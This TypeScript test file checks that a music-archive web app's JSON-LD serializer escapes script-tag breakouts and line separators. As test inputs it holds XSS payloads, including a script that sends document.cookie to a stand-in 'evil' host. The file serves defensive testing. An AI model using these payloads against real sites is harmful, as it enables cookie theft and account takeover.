import { describe, expect, it } from "vitest";
import { serializeJsonLd } from "@/lib/json-ld";
import { Route as FindingsRoute } from "./findings";
import { Route as FrontDoorRoute } from "./index";
import { Route as LogRoute } from "./log.$logId";

type HeadScript = { children: string; type: string };
type HeadResult = { meta?: Array<Record<string, unknown>>; scripts?: Array<HeadScript> };

function ldChildren(head: HeadResult): Array<string> {
  return (head.scripts ?? [])
    .filter((script) => script.type === "application/ld+json")
    .map((script) => script.children);
}

const PAYLOAD = "Tune</script><img src=x onerror=alert(document.cookie)>";

describe("jsonLdScript (serializeJsonLd)", () => {
  it("escapes the </script> breakout chars but round-trips to the same JSON", () => {
    const jsonLd = { "@type": "Thing", name: PAYLOAD };
    const rendered = serializeJsonLd(jsonLd);

    expect(rendered).not.toContain("</script>");
    expect(rendered).not.toContain("<");
    expect(rendered).not.toContain(">");
    expect(rendered).toContain("\\u003c/script\\u003e");

    expect(JSON.parse(rendered)).toEqual(jsonLd);
  });

  it("escapes the U+2028/U+2029 line separators", () => {
    const rendered = serializeJsonLd({ name: "a b c" });

    expect(rendered).toContain("\\u2028");
    expect(rendered).toContain("\\u2029");
    expect(rendered).not.toContain(" ");
    expect(rendered).not.toContain(" ");
  });
});

describe("JSON-LD output encoding (stored-XSS guard)", () => {
  it("the archive page's MusicPlaylist neutralizes a </script> in a track title/artist/album", () => {
    const loaderData = {
      totalCount: 1,
      tracks: [
        {
          album: PAYLOAD,
          artists: [PAYLOAD],
          spotifyUrl: "https://open.spotify.com/track/abc",
          title: PAYLOAD,
          type: "track",
        },
      ],
    } as never;

    const head = FindingsRoute.options.head?.({ loaderData } as never) as HeadResult;
    const playlist = ldChildren(head).find((c) => c.includes("MusicPlaylist"));

    expect(playlist).toBeDefined();

    expect(playlist).not.toContain("</script>");
    expect(playlist).toContain("\\u003c/script\\u003e");

    const parsed = JSON.parse(playlist as string) as {
      track: Array<{ inAlbum: { name: string }; name: string }>;
    };
    const firstTrack = parsed.track[0];
    if (firstTrack === undefined) {
      throw new Error("expected at least one track in the playlist JSON-LD");
    }
    expect(firstTrack.name).toBe(PAYLOAD);
    expect(firstTrack.inAlbum.name).toBe(PAYLOAD);
  });

  it("the front door's CollectionPage ItemList neutralizes a </script> in a finding", () => {
    const loaderData = {
      counts: { albums: 0, artists: 0, labels: 0, tracks: 0 },
      findings: [{ artists: [PAYLOAD], logId: "004.7.2I", title: PAYLOAD }],
      findingsTotal: 1,
      lead: { artists: [PAYLOAD], logId: "011.6.8K", title: PAYLOAD },
      releaseWindowDays: 30,
      releases: [],
    } as never;

    const head = FrontDoorRoute.options.head?.({ loaderData } as never) as HeadResult;
    const collection = ldChildren(head).find((c) => c.includes("CollectionPage"));

    expect(collection).toBeDefined();
    expect(collection).not.toContain("</script>");
    expect(collection).toContain("\\u003c/script\\u003e");

    const parsed = JSON.parse(collection as string) as {
      mainEntity: { itemListElement: Array<{ item: { name: string } }>; numberOfItems: number };
    };

    expect(parsed.mainEntity.numberOfItems).toBe(2);
    expect(parsed.mainEntity.itemListElement[0]?.item.name).toBe(PAYLOAD);
  });

  it("log page MusicRecording neutralizes a </script> in the title and the operator note", () => {
    const evilNote = 'Banger</script><script>fetch("//evil/"+document.cookie)</script>';
    const track = {
      addedAt: "2026-06-03T18:21:00.000Z",
      album: "Some Album",
      artists: ["Axwell"],
      bpm: 172,
      durationMs: 215_000,
      key: "F major",
      label: "Some Label",
      logId: "004.7.2I",
      note: evilNote,
      spotifyUrl: "https://open.spotify.com/track/abc",
      title: PAYLOAD,
      trackId: "abc",
      updatedAt: "2026-06-04T00:00:00.000Z",
    };
    const loaderData = { related: [], status: "found", track } as never;

    const head = LogRoute.options.head?.({ loaderData } as never) as HeadResult;
    const recording = ldChildren(head).find((c) => c.includes("MusicRecording"));

    expect(recording).toBeDefined();

    expect(recording).not.toContain("</script>");
    expect(recording).toContain("\\u003c/script\\u003e");

    const parsed = JSON.parse(recording as string) as { description: string; name: string };
    expect(parsed.name).toBe(PAYLOAD);
    expect(parsed.description).toContain(evilNote);
  });

  it("log page AudioObject neutralizes a </script> and emits only once an observation exists", () => {
    const track = {
      addedAt: "2026-06-03T18:21:00.000Z",
      artists: ["Axwell"],
      durationMs: 215_000,
      logId: "004.7.2I",
      observationAudioUrl: "https://found.fluncle.com/004.7.2I/observation.mp3?v=1765534200000",
      observationDurationMs: 34_000,
      observationGeneratedAt: "2026-06-12T09:30:00.000Z",
      spotifyUrl: "https://open.spotify.com/track/abc",
      title: PAYLOAD,
      trackId: "abc",
    };

    const head = LogRoute.options.head?.({
      loaderData: { related: [], status: "found", track } as never,
    } as never) as HeadResult;
    const audio = ldChildren(head).find((c) => c.includes("AudioObject"));

    expect(audio).toBeDefined();

    expect(audio).not.toContain("</script>");
    expect(audio).toContain("\\u003c/script\\u003e");
    const parsed = JSON.parse(audio as string) as { name: string };
    expect(parsed.name).toContain(PAYLOAD);

    const bareHead = LogRoute.options.head?.({
      loaderData: {
        related: [],
        status: "found",
        track: { ...track, observationAudioUrl: undefined },
      } as never,
    } as never) as HeadResult;

    expect(ldChildren(bareHead).find((c) => c.includes("AudioObject"))).toBeUndefined();
  });
});
